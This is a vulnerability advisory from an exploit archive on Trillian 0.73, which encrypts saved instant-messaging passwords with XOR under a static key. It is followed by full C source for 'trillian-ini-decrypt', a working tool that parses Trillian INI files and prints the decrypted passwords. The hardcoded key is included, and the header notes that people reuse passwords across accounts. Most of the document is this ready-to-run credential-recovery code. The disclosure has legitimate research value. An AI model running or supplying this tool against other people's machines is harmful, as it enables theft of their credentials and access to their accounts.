source: http://www.securityfocus.com/bid/5677/info

The Trillian instant messaging client uses weak encryption to store saved authentication credentials for instant messaging services. The credentials are encrypted by using XOR with a static key that is used with every installation of the software.

Local attackers may potentially exploit this weakness to gain access to another user's instant messaging credentials. 

/********************************
 * trillian-ini-decrypt
 * By The Coeus Group
 * http://www.coeus-group.com
 ********************************
 * 	Software: 	Trillian 0.73, possibly others.
 *	Issue:		Weak "encryption" of saved passwords.
 *	Impact:		Decryption of saved passwords.
 *	Severity:	Medium. ish. The program only works locally, and only
 *			if the subject has saved their password, and really
 *			if someone can get into your AIM account, how earth-
 *			shattering is that??? However, since a lot of people
 *			use the same password for everything... What's easier,
 *			getting the password from Trillian, or Wells Fargo???
 ********************************
 * Trillian is, according to trillian.cc, "...everything you need for instant
 * messaging. Connect to ICQ�, AOL Instant Messenger(SM), MSN Messenger, Yahoo!
 * Messenger and IRC in a single, sleek and slim interface."
 *
 * Upon examination of the Trillian directory (which defaults to
 * C:\Program Files\Trillian\ ), it appears that passwords are stored in
 * ini files that are located in {Path to Trillian}\users\{WindowsLogon}. The
 * passwords are encrypted using a simple XOR with a key apparently uniform
 * throughout every installation.
 *
 * This program takes, as command line argument(s), path(s) to these INI files.
 * It will then display a list of usernames, "encrypted" passwords, and plaintext
 * passwords.
 *
 * Evan Nemerson
 * enemerson@coeus-group.com */

#include <stdio.h>
#include <errno.h>
#include <stdlib.h>

#ifndef FALSE
#define FALSE 0
#endif

#ifndef TRUE
#define TRUE 1
#endif

void toupper(char* string);
int strlen(const char *s);
int strBeginsWith(const char *needle, const char *haystack);
int strIs(const char *subj, const char *eq);
void extractAcctounts(FILE *fp);
char *hex2str(char *string);
void decrypt();
void outPasswds();
void printhelp();
int main(int argc, char *argv[]);

struct account
{
	char username[64];
	char cyphertext[64];
	char plaintext[32];
};

extern int errno;
struct account *pAccounts[32];
short int nAccounts = 0;
char key[] =		"\xF3\x26\x81\xC4"
			"\x39\x86\xDB\x92"
			"\x71\xA3\xB9\xE6"
			"\x53\x7A\x95\x7C";

void toupper(char* string)
{
	short int x = 0;
	for ( x = 0 ; x < (strlen(string)) ; x++ )
	{
		if ( ( string[x] > 96 ) && ( string[x] < 123 ) )
			string[x] -= 32;
	}
}

int strlen(const char *s)
{
	short int n = 0;
	while ( s[n] != 0 )
		n++;
	return n;
}

int strBeginsWith(const char *needle, const char *haystack)
{
	short int x;

	if ( strlen(needle) > strlen(haystack) )
		return FALSE;

	for ( x = 0 ; x < strlen(needle) ; x++ )
	{
		if ( needle[x] != haystack[x] )
			return FALSE;
	}

	return TRUE;
}

int strIs(const char *subj, const char *eq)
{
	short int x;

	if ( strlen(subj) != strlen(eq) )
		return FALSE;
	for ( x = 0 ; x < strlen(subj) ; x++ )
	{
		if ( subj[x] != eq[x] )
			return FALSE;
	}

	return TRUE;
}

void extractAcctounts(FILE *fp)
{
	char buff[256], *ptr;
	int x;
	while ( !feof(fp) )
	{
		fgets(buff, 255, fp);
		if ( strBeginsWith("name=", buff) )
		{
			buff[strlen(buff)-1] = 0;
			pAccounts[nAccounts] = (struct account*)malloc(sizeof(struct account));
			if ( pAccounts[nAccounts] == NULL )
			{
				perror("Failed to malloc()");
				exit(errno);
			}
			ptr = pAccounts[nAccounts]->username;
			for ( x = 5 ; x < strlen(buff) ; x++ )
			{
				ptr[x-5] = buff[x];
			}
			ptr[x-5] = 0;
			nAccounts++;
		}
		if ( strBeginsWith("password=", buff) )
		{
			buff[strlen(buff)-1] = 0;
			ptr = pAccounts[nAccounts-1]->cyphertext;
			for ( x = 9 ; x < strlen(buff) ; x++ )
			{
				ptr[x-9] = buff[x];
			}
			ptr[x-9] = 0;
		}
	}
}

char *hex2str(char *string)
{
	int x=0,n=0,i=0;
	unsigned char hex[2];
	unsigned char *out;
	out = (unsigned char*)malloc((strlen(string)/2)+1);
	if ( out == NULL )
	{
		perror("Failed to malloc()");
		exit(errno);
	}

	// For hex number...
	for ( x = 0 ; x < strlen(string) ; x+=2 )
	{
		out[i] = 0;
		// Convert ASCII 0-F to decimal.
		hex[0] = string[x]-48;
		hex[1] = string[x+1]-48;
		for ( n = 0 ; n < 2 ; n++ )
		{
			if ( hex[n] > 9 )
				hex[n] -= 7;
		}
		out[i++] = (hex[0]*16)+hex[1];
	}
	out[i++] = 0;
	return out;
}

void decrypt()
{
	int n, x;
	char *plain, *cypher;

	for ( x = 0 ; x < nAccounts ; x++ )
	{
		cypher = hex2str(pAccounts[x]->cyphertext);
		plain  = pAccounts[x]->plaintext;

		for ( n = 0 ; n < (strlen(cypher)-1) ; n++ )
		{
			plain[n] = cypher[n] ^ key[n];
		}
	}
}

void outPasswds()
{
	int x;
	printf(
		"/----------------------------\\\n"
		"| trillian-ini-decrypt       |\n"
		"| By The Coeus Group         |\n"
		"| http://www.coeus-group.com |\n"
		"\\----------------------------/\n");
	printf("Found %d accounts.\n\n", nAccounts);
	for ( x = 0 ; x < nAccounts ; x++ )
	{
		printf(	"Username:           : %s\n"
			"Password (encrypted): %s\n"
			"Password (decrypted): %s\n\n",
			pAccounts[x]->username,
			pAccounts[x]->cyphertext,
			pAccounts[x]->plaintext
		);
	}
}

void printhelp()
{
	printf(	"Just put the path to Trillian INI file as command-line\n"
		"parameter. Don't forget to quote as needed. Will accept\n"
		"multiple files.\n");
	exit(0);
}

int main(int argc, char *argv[])
{
	short int x;
	FILE *fp;

	if ( ( argc < 2 ) ) { printhelp(); }
	if (	( strIs(argv[1],     "-h") )	|
		( strIs(argv[1], "--help") )	|
		( strIs(argv[1],     "/?") )
	) printhelp();

	for ( x = 1 ; x < argc ; x++ )
	{
		fp = fopen(argv[x], "r");
		if ( fp == NULL )
		{
			perror("Error");
			exit(errno);
		}
		extractAcctounts(fp);
	}

	decrypt();
	outPasswds();

	return 0;
}
